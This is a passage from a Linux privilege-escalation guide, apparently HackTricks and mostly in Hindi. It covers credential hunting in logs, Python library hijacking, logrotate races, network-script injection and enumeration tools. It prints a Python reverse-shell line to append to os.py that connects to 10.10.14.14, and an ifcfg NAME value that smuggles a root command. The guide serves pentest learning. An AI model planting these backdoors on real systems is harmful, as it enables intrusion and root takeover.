**एक और दिलचस्प टूल** जिसका आप उपयोग कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो कि एक ओपन-सोर्स एप्लिकेशन है जिसका उपयोग लोकल कंप्यूटर पर Windows, Linux & Mac के लिए स्टोर किए गए कई पासवर्ड निकालने के लिए किया जाता है।

### लॉग

यदि आप लॉग पढ़ सकते हैं, तो आप उनमें **दिलचस्प/गोपनीय जानकारी** पा सकते हैं। जितना अजीब लॉग होगा, उतना ही (शायद) अधिक रोचक होगा।\
इसके अलावा, कुछ **"खराब"** कॉन्फ़िगर किए गए (backdoored?) **audit logs** आपको audit logs के अंदर **पासवर्ड रिकॉर्ड** करने की अनुमति दे सकते हैं जैसा इस पोस्ट में बताया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
लॉग्स पढ़ने के लिए समूह [**adm**](interesting-groups-linux-pe/index.html#adm-group) बहुत मददगार होगा।

### Shell फ़ाइलें
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको उन फ़ाइलों की भी जाँच करनी चाहिए जिनके नाम में या उनके कंटेंट में शब्द "**password**" मौजूद हो, और साथ ही लॉग्स में IPs और emails या hashes के लिए regexps भी चेक करें।\
मैं यहाँ इन सबका तरीका सूचीबद्ध नहीं कर रहा हूँ, लेकिन अगर आप रुचि रखते हैं तो आप देख सकते हैं कि [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) कौन-सी अंतिम जांचें perform करता है।

## लिखने योग्य फ़ाइलें

### Python library hijacking

यदि आप जानते हैं कि कोई python स्क्रिप्ट **where** से निष्पादित होने वाली है और आप उस फ़ोल्डर में **can write inside** कर सकते हैं या आप **modify python libraries** कर सकते हैं, तो आप OS लाइब्रेरी को बदलकर उसमें backdoor लगा सकते हैं (यदि आप उस स्थान पर लिख सकते हैं जहाँ python स्क्रिप्ट निष्पादित होगी, तो os.py लाइब्रेरी को copy और paste करें)।

To **backdoor the library** बस os.py लाइब्रेरी के अंत में निम्न पंक्ति जोड़ें (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` में एक vulnerability ऐसी users को, जिनके पास किसी लॉग फ़ाइल या उसकी parent डायरेक्टरीज़ पर **write permissions** हैं, संभावित रूप से privileges escalate करने की अनुमति देती है। यह इसलिए होता है क्योंकि `logrotate`, जो अक्सर **root** के रूप में चलता है, को arbitrary फाइलें execute करने के लिए manipulate किया जा सकता है, खासकर उन डायरेक्टरीज़ में जैसे _**/etc/bash_completion.d/**_. यह महत्वपूर्ण है कि आप सिर्फ _/var/log_ ही नहीं बल्कि उन किसी भी डायरेक्टरी की permissions जांचें जहाँ log rotation लागू की जा रही हो।

> [!TIP]
> This vulnerability affects `logrotate` version `3.18.0` and older

वulnerabilidade के बारे में अधिक विस्तृत जानकारी इस पेज पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस vulnerability का फायदा [**logrotten**](https://github.com/whotwagner/logrotten) से उठा सकते हैं।

यह vulnerability [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** के बहुत समान है, इसलिए जब भी आप पाते हैं कि आप logs बदल सकते हैं, तो देखें कि कौन उन logs का प्रबंधन कर रहा है और जांचें कि क्या आप logs को symlinks से बदलकर privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी कारणवश कोई user _/etc/sysconfig/network-scripts_ में कोई `ifcf-<whatever>` script **write** कर सके **or** किसी मौजूदा script को **adjust** कर सके, तो आपका **system is pwned**।

Network scripts, जैसे _ifcg-eth0_ उदाहरण के लिए, network connections के लिए उपयोग होते हैं। ये बिल्कुल .INI files की तरह दिखते हैं। हालांकि, इन्हें Linux पर Network Manager (dispatcher.d) द्वारा \~sourced\~ किया जाता है।

मेरे मामले में, इन network scripts में `NAME=` attribute को सही तरीके से handle नहीं किया जाता। अगर नाम में **white/blank space** हो तो system नाम के उस हिस्से के बाद वाले भाग को execute करने की कोशिश करता है। इसका मतलब यह है कि **पहले blank space के बाद जो कुछ भी है वह root के रूप में execute होता है**।

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network और /bin/id के बीच खाली स्थान पर ध्यान दें_)

### **init, init.d, systemd, और rc.d**

डायरेक्टरी `/etc/init.d` System V init (SysVinit) के लिए **scripts** का स्थान है, जो कि **classic Linux service management system** है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने वाले स्क्रिप्ट शामिल होते हैं। इन्हें सीधे चलाया जा सकता है या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से। Redhat सिस्टम्स में वैकल्पिक पथ `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` **Upstart** से जुड़ा है, जो Ubuntu द्वारा प्रस्तुत एक नया **service management** है और यह सेवा प्रबंधन कार्यों के लिए configuration files का उपयोग करता है। Upstart में संक्रमण के बावजूद, compatibility layer के कारण SysVinit स्क्रिप्ट अभी भी Upstart configuration के साथ साथ उपयोग में रहते हैं।

**systemd** एक आधुनिक initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसे उन्नत फीचर प्रदान करता है। यह फाइलों को distribution packages के लिए `/usr/lib/systemd/` और administrator संशोधनों के लिए `/etc/systemd/system/` में व्यवस्थित करता है, जिससे system administration प्रक्रिया सरल होती है।

## अन्य तरकीबें

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks अक्सर privileged kernel functionality को userspace manager तक पहुंचाने के लिए एक syscall को hook करते हैं। कमजोर manager authentication (उदा., FD-order पर आधारित signature checks या कमजोर password schemes) एक local app को manager की नकल करने और पहले से-rooted devices पर root तक escalate करने में सक्षम बना सकती है। अधिक जानकारी और exploitation के विवरण यहाँ देखें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations में regex-driven service discovery प्रोसेस command lines से एक binary path निकाल सकता है और privileged context में उसे -v के साथ execute कर सकता है। permissive patterns (उदा., \S का उपयोग) writable locations (उदा., /tmp/httpd) में attacker-staged listeners से मेल खा सकते हैं, जिसके परिणामस्वरूप root के रूप में execution हो सकता है (CWE-426 Untrusted Search Path).

अधिक जानें और अन्य discovery/monitoring stacks पर लागू होने वाले सामान्यीकृत पैटर्न को यहाँ देखें:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## और मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)

{{#include ../../banners/hacktricks-training.md}}
